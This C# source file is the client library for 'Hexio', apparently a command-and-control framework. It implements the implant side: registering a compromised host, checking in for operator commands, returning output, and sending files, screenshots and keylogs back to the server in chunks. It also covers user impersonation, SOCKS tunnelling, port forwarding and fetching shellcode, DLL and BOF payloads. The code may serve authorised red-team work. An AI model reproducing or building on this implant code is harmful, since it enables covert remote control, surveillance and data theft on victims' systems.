using System;
using System.Collections.Generic;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;

namespace Hexio;

public class HexioApiException : Exception
{
    public int StatusCode { get; }
    public HexioApiException(int statusCode, string message)
        : base($"API error ({statusCode}): {message}")
    {
        StatusCode = statusCode;
    }
}

public sealed class HexioClient : IDisposable
{
    public string BaseUrl { get; }
    public string Passphrase { get; }
    public string? Token { get; set; }
    public long AgentId { get; set; }

    private readonly HttpClient _http;
    private readonly bool _ownsHttp;

    private static readonly JsonSerializerOptions JsonOpts = new()
    {
        DefaultIgnoreCondition = JsonIgnoreCondition.WhenWritingNull,
    };

    public HexioClient(string baseUrl, string passphrase, HttpClient? httpClient = null)
    {
        BaseUrl = baseUrl.TrimEnd('/');
        Passphrase = passphrase;
        _http = httpClient ?? new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        _ownsHttp = httpClient == null;
    }

    public void Dispose()
    {
        if (_ownsHttp) _http.Dispose();
    }

    // --- Transport ---

    private async Task<JsonElement> RequestAsync(HttpMethod method, string path, object? body, CancellationToken ct)
    {
        using var req = new HttpRequestMessage(method, BaseUrl + path);
        req.Headers.TryAddWithoutValidation("HexioExternalAgentAuth", Passphrase);
        if (!string.IsNullOrEmpty(Token))
            req.Headers.TryAddWithoutValidation("HexioAgentToken", Token);

        if (body != null)
        {
            var json = JsonSerializer.Serialize(body, JsonOpts);
            req.Content = new StringContent(json, Encoding.UTF8, "application/json");
        }

        using var resp = await _http.SendAsync(req, HttpCompletionOption.ResponseContentRead, ct).ConfigureAwait(false);
        var text = await resp.Content.ReadAsStringAsync().ConfigureAwait(false);

        if (!resp.IsSuccessStatusCode)
        {
            string message = text;
            try
            {
                using var doc = JsonDocument.Parse(text);
                if (doc.RootElement.TryGetProperty("error", out var errProp))
                    message = errProp.GetString() ?? text;
            }
            catch { }
            throw new HexioApiException((int)resp.StatusCode, message);
        }

        if (string.IsNullOrEmpty(text))
        {
            using var empty = JsonDocument.Parse("{}");
            return empty.RootElement.Clone();
        }

        using var parsed = JsonDocument.Parse(text);
        return parsed.RootElement.Clone();
    }

    private T Request<T>(HttpMethod method, string path, object? body, CancellationToken ct)
    {
        var el = RequestAsync(method, path, body, ct).GetAwaiter().GetResult();
        return el.Deserialize<T>(JsonOpts)!;
    }

    // --- Registration ---

    public RegisterResponse Register(RegisterRequest req, CancellationToken ct = default)
    {
        var resp = Request<RegisterResponse>(HttpMethod.Post, "/register", req, ct);
        Token = resp.Token;
        AgentId = resp.AgentId;
        return resp;
    }

    public async Task<RegisterResponse> RegisterAsync(RegisterRequest req, CancellationToken ct = default)
    {
        var el = await RequestAsync(HttpMethod.Post, "/register", req, ct).ConfigureAwait(false);
        var resp = el.Deserialize<RegisterResponse>(JsonOpts)!;
        Token = resp.Token;
        AgentId = resp.AgentId;
        return resp;
    }

    // --- Checkin / Sync ---

    public CheckinResponse Checkin(CancellationToken ct = default)
        => Request<CheckinResponse>(HttpMethod.Get, "/agent/checkin", null, ct);

    public JsonElement Sync(long? sleepTime = null, long? sleepJitter = null, CancellationToken ct = default)
    {
        object? body = null;
        if (sleepTime.HasValue)
        {
            var sleep = new Dictionary<string, long> { ["sleep_time"] = sleepTime.Value };
            if (sleepJitter.HasValue) sleep["sleep_jitter"] = sleepJitter.Value;
            body = new Dictionary<string, object> { ["sleep"] = sleep };
        }
        return RequestAsync(HttpMethod.Post, "/agent/sync", body, ct).GetAwaiter().GetResult();
    }

    public JsonElement SyncRaw(object body, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/sync", body, ct).GetAwaiter().GetResult();

    // --- Command Response ---

    public JsonElement CommandResponse(long commandId, string command, string response, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/command/response", new
        {
            command_id = commandId,
            command,
            response,
        }, ct).GetAwaiter().GetResult();

    // --- Downloads ---

    public DownloadInitResponse DownloadInit(DownloadInitRequest req, CancellationToken ct = default)
        => Request<DownloadInitResponse>(HttpMethod.Post, "/agent/download/init", req, ct);

    public JsonElement DownloadChunk(string downloadId, byte[] chunk, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/download/chunk", new
        {
            download_id = downloadId,
            chunk_data = Convert.ToBase64String(chunk),
        }, ct).GetAwaiter().GetResult();

    public JsonElement DownloadCancel(string downloadId, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/download/cancel", new { download_id = downloadId }, ct).GetAwaiter().GetResult();

    public string DownloadFile(string filePath, byte[] data, int chunkSize = 65536, CancellationToken ct = default)
    {
        var name = filePath;
        var slash = filePath.LastIndexOfAny(new[] { '/', '\\' });
        if (slash >= 0) name = filePath.Substring(slash + 1);

        if (chunkSize < 1) chunkSize = 1;
        var totalChunks = (data.Length + chunkSize - 1) / chunkSize;

        var init = DownloadInit(new DownloadInitRequest
        {
            FileName = name,
            AgentPath = filePath,
            FileSize = data.Length,
            ChunkSize = chunkSize,
            TotalChunks = totalChunks,
        }, ct);

        for (int i = 0; i < totalChunks; i++)
        {
            var start = i * chunkSize;
            var len = Math.Min(chunkSize, data.Length - start);
            var chunk = new byte[len];
            Buffer.BlockCopy(data, start, chunk, 0, len);
            DownloadChunk(init.DownloadId, chunk, ct);
        }
        return init.DownloadId;
    }

    // --- Screenshot / Keylog ---

    public JsonElement Screenshot(string filename, byte[] imageData, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/screenshot", new
        {
            filename,
            data = Convert.ToBase64String(imageData),
        }, ct).GetAwaiter().GetResult();

    public JsonElement Keylog(string filename, string data, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/keylog", new { filename, data }, ct).GetAwaiter().GetResult();

    // --- Impersonation ---

    public JsonElement SetImpersonation(string user, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/impersonation", new { user }, ct).GetAwaiter().GetResult();

    public JsonElement ClearImpersonation(CancellationToken ct = default) => SetImpersonation("", ct);

    // --- Side Channel ---

    public JsonElement Sidechannel(string channelId, string dataB64, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/sidechannel", new
        {
            channel_id = channelId,
            data = dataB64,
        }, ct).GetAwaiter().GetResult();

    // --- File Requests ---

    public JsonElement RequestFiles(FileRequest req, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/files/request", req, ct).GetAwaiter().GetResult();

    // --- SOCKS ---

    public JsonElement SocksOpen(long? port = null, CancellationToken ct = default)
    {
        object body = port.HasValue ? (object)new { port = port.Value } : new { };
        return RequestAsync(HttpMethod.Post, "/agent/socks/open", body, ct).GetAwaiter().GetResult();
    }

    public JsonElement SocksClose(CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/socks/close", new { }, ct).GetAwaiter().GetResult();

    public JsonElement SocksSync(object data, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/socks/sync", data, ct).GetAwaiter().GetResult();

    // --- Port Forwarding ---

    public JsonElement PortFwdOpen(long port, string remoteHost, long remotePort, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/portfwd/open", new
        {
            port,
            remote_host = remoteHost,
            remote_port = remotePort,
        }, ct).GetAwaiter().GetResult();

    public JsonElement PortFwdClose(long port, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/portfwd/close", new { port }, ct).GetAwaiter().GetResult();

    public JsonElement PortFwdSync(object data, CancellationToken ct = default)
        => RequestAsync(HttpMethod.Post, "/agent/portfwd/sync", data, ct).GetAwaiter().GetResult();
}

// --- DTOs ---

public class RegisterRequest
{
    [JsonPropertyName("hostname")] public string Hostname { get; set; } = "";
    [JsonPropertyName("ip")] public string Ip { get; set; } = "";
    [JsonPropertyName("user")] public string User { get; set; } = "";
    [JsonPropertyName("os")] public string Os { get; set; } = "";
    [JsonPropertyName("process")] public string Process { get; set; } = "";
    [JsonPropertyName("pid")] public long Pid { get; set; }
    [JsonPropertyName("client_type")] public string ClientType { get; set; } = "";
    [JsonPropertyName("sleep_time")] public long SleepTime { get; set; }
    [JsonPropertyName("arch")] public string Arch { get; set; } = "";
}

public class RegisterResponse
{
    [JsonPropertyName("agent_id")] public long AgentId { get; set; }
    [JsonPropertyName("token")] public string Token { get; set; } = "";
}

public class Command
{
    [JsonPropertyName("id")] public long Id { get; set; }
    [JsonPropertyName("command")] public string Text { get; set; } = "";
}

public class CheckinResponse
{
    [JsonPropertyName("commands")] public List<Command> Commands { get; set; } = new();
    [JsonPropertyName("files")] public List<JsonElement>? Files { get; set; }
}

public class DownloadInitRequest
{
    [JsonPropertyName("file_name")] public string FileName { get; set; } = "";
    [JsonPropertyName("agent_path")] public string AgentPath { get; set; } = "";
    [JsonPropertyName("file_size")] public long FileSize { get; set; }
    [JsonPropertyName("chunk_size")] public long ChunkSize { get; set; }
    [JsonPropertyName("total_chunks")] public long TotalChunks { get; set; }
}

public class DownloadInitResponse
{
    [JsonPropertyName("download_id")] public string DownloadId { get; set; } = "";
    [JsonPropertyName("agent_path")] public string AgentPath { get; set; } = "";
}

public class FileRequest
{
    [JsonPropertyName("bof_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? BofFiles { get; set; }
    [JsonPropertyName("pe_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? PeFiles { get; set; }
    [JsonPropertyName("dll_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? DllFiles { get; set; }
    [JsonPropertyName("elf_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? ElfFiles { get; set; }
    [JsonPropertyName("macho_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? MachoFiles { get; set; }
    [JsonPropertyName("shellcode_files"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? ShellcodeFiles { get; set; }
    [JsonPropertyName("hexlang"), JsonIgnore(Condition = JsonIgnoreCondition.WhenWritingNull)]
    public List<string>? Hexlang { get; set; }
}
